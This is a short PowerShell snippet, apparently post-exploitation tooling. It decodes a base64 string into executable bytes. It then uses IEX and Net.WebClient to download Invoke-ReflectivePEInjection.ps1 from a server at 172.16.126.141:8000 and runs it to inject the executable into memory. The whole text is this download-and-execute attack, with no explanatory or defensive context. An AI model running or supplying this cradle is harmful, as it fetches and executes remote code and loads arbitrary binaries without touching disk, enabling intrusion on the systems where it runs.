$PEBytes = [System.Convert]::FromBase64String($InputString)
IEX (New-Object Net.WebClient).DownloadString('http://172.16.126.141:8000/Invoke-ReflectivePEInjection.ps1'); Invoke-ReflectivePEInjection -PEBytes $PEBytes 
